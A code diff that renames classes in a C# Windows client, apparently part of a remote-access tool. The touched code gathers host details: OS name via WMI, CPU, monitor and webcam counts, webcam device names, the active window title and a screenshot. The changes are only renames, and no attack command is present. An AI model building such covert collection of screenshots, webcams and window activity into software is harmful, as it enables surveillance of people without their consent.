@@ -18,7 +18,7 @@ using System.Windows.Forms;
 
 namespace winClient48
 {
-    public class Global
+    public class clsGlobal
     {
         //GZIP
         public static byte[] Compress(byte[] abBuffer)
@@ -264,7 +264,7 @@ namespace winClient48
             {
                 //string result = Environment.OSVersion.ToString();
                 string result = null;
-                try { result = Global.WMI_QueryNoEncode("select caption from Win32_OperatingSystem")[0]; } catch { }
+                try { result = clsGlobal.WMI_QueryNoEncode("select caption from Win32_OperatingSystem")[0]; } catch { }
                 if (result == null)
                     try { result = RuntimeInformation.OSDescription; } catch { }
                 if (result == null)
@@ -274,9 +274,9 @@ namespace winClient48
             }
         }
         public int dwPing;
-        public string szCPU => Global.getCPU();
+        public string szCPU => clsGlobal.getCPU();
         public int dwMonitorCount => Screen.AllScreens.Length;
-        public int dwWebcamCount => new Webcam().GetDevices().Count;
+        public int dwWebcamCount => new clsfnWebcam().GetDevices().Count;
         public string szActiveWindowTitle;
         public Image imgScreenshot;
     }
@@ -328,7 +328,7 @@ namespace winClient48
         /* Key: Webcam name
          * Value: Webcam rectangle(size) */
 
-        public List<string> ls_Webcam => new Webcam().GetDevices();
+        public List<string> ls_Webcam => new clsfnWebcam().GetDevices();
     }
     public struct WindowInfo
     {
